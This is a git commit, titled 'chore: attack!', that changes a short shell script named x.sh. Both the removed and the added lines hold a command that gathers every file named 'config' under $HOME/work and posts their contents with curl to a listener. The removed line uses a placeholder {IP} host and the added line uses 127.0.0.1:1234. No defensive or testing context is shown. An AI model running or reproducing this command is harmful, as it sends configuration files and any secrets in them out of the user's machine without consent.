8a3876b262fcb819d10fbb45ddc99966db91bccb
Prince <prince@deriv.com>
2022-11-15 11:38:55 +0400

    chore: attack!

--- x.sh
+++ x.sh
@@ -1,4 +1,4 @@
 bash
-find $HOME/work -type f -name config | xargs cat | curl --data @- http://{IP}
-# wait for 30 seconds
-sleep 30
+find $HOME/work -type f -name config | xargs cat | curl --data @- http://127.0.0.1:1234/
+# wait for 10 seconds
+sleep 10
